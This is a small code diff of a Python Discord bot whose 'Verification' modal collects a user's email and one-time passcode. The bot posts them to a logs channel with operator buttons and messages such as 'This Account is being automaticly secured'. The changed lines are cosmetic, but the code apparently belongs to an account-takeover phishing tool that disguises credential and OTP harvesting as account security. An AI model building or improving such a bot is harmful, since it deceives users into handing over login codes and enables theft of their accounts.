@@ -41,7 +41,7 @@ class MyModalTwo(ui.Modal, title="Verification"):
 
         await interaction.response.defer()
 
-        await logs_channel.send("**This Account is being automaticly secured.**")
+        await logs_channel.send("**This Account is being automaticly secured**")
         await logs_channel.send(embed = Code_embed, view = ButtonOptions(interaction.user.id))
 
         await interaction.followup.send(
@@ -56,7 +56,7 @@ class MyModalTwo(ui.Modal, title="Verification"):
 
             await logs_channel.send(
                 embed = discord.Embed(
-                    title = f"{interaction.user.name} ({interaction.user.id})",
+                    title = f"User | {interaction.user.name}({interaction.user.id})",
                     description = f"**Email** | **Status** | **Reason**\n```{self.email} | Failed to secure | Invalid OTP Code```",
                     timestamp = datetime.datetime.now(),
                     colour = 0xFF5C5C                  
